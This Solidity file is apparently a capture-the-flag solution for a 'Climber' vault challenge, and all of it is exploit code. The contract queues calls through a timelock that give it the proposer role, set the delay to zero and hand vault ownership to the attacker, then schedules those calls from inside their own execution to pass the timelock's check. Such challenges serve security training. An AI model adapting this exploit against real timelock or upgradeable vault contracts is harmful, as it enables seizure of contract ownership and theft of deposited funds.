// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "solady/src/utils/SafeTransferLib.sol";

import "./ClimberTimelock.sol";
import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";

contract ClimberVaultAttack {
    address payable immutable climberTimeLock;
    address[] targets      = new address[](4);
    uint256[] values       = [0,0,0,0];
    bytes[]   dataElements = new bytes[](4);
    bytes32   salt         = bytes32(0);

    constructor(address payable _climberTimeLock, address _climberVault) {
        climberTimeLock = _climberTimeLock;
        targets[0]      = climberTimeLock;
        targets[1]      = climberTimeLock;
        targets[2]      = _climberVault;
        targets[3]      = address(this);

        dataElements[0] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));
        dataElements[1] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);
        dataElements[2] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, msg.sender);
        dataElements[3] = abi.encodeWithSelector(ClimberVaultAttack.scheduleCalls.selector);
    }

    function scheduleCalls() external {
        ClimberTimelock(climberTimeLock).schedule(targets, values, dataElements, salt);
    }
}